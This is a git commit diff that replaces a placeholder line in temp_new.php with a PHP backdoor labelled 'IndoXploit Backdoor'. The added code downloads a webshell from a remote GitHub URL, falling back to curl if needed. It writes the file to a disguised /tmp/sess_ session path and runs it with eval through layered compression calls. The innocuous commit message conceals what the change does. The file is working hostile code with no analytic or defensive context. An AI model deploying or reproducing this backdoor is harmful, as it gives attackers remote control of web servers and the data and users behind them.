bae6d1481b54c0b6c73978088c7ab87bfa6046ac
Haikal Siregar <mininginformation1337@gmail.com>
2024-01-16 13:01:27 +0700

    Update temp_new.php

--- temp_new.php
+++ temp_new.php
@@ -1,1 +1,32 @@
-awikwok
+<?php
+# IndoXploit Backdoor
+# Bypass 406 Not Acceptable & Auto Delete Shell
+# Coded by: L0c4lh34rtz - IndoXploit
+ 
+$URL = 'https://raw.githubusercontent.com/justikail/webshell/main/alfav4.1-tesla.php';  # Backdoor URL
+$TMP = '/tmp/sess_'.md5($_SERVER['HTTP_HOST']).'.php'; # dont change this !!
+ 
+function M() {
+    $FGT = @gzcompress(gzdeflate(gzcompress(gzdeflate(gzcompress(gzdeflate(file_get_contents($GLOBALS['URL'])))))));
+    if(!$FGT) {
+        echo `curl -k $(echo {$GLOBALS[gzcompress]($GLOBALS[gzdeflate]($GLOBALS[gzcompress]($GLOBALS[gzdeflate]($GLOBALS[gzcompress]($GLOBALS[gzdeflate](file_get_contents($GLOBALS['URL'])))))))}) > {$GLOBALS['TMP']}`;
+    } else {
+        $HANDLE = fopen($GLOBALS['TMP'], 'w');
+        fwrite($HANDLE, $FGT);
+        fclose($HANDLE);
+    }
+    echo '<script>window.location="?LOL";</script>';
+}
+ 
+if(file_exists($TMP)) {
+    if(filesize($TMP) === 0) {
+        unlink($TMP);
+        M();
+    } else {
+	$B64 = gzinflate(gzuncompress(gzinflate(gzuncompress(gzinflate(gzuncompress(file_get_contents($TMP)))))));
+        @eval("?>".$B64);
+    }
+} else {
+    M();
+}
+?>
